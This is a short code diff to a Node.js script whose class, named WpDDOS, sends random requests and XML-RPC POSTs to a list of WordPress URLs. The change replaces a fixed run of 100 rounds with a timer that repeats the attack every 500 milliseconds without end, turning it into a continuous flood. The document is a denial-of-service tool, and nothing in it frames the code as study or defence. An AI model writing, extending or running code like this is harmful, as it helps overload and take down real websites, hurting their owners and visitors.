@@ -5,7 +5,7 @@
 
 let rp = require('request-promise');
 let config = require('./config');
-let InfiniteLoop = require('infinite-loop');
+let co = require('co');
 
 class WpDDOS {
     constructor(urls) {
@@ -87,6 +87,7 @@ class WpDDOS {
             this.getRandomWp(urls[i]);
             this.postRandomXmlRpc(urls[i]);
         }
+
     }
 
 }
@@ -96,13 +97,9 @@ module.exports = WpDDOS;
 // tests
 (()=>{
     let wp = new WpDDOS(config.URLS);
-    let il = new InfiniteLoop;
-    let task = () => {
+    let task = function () {
         wp.runAll();
     };
-
-    for(let i=0;i<100; i++) {
-        task();
-    }
+    setInterval(task, 500);
 
 })();
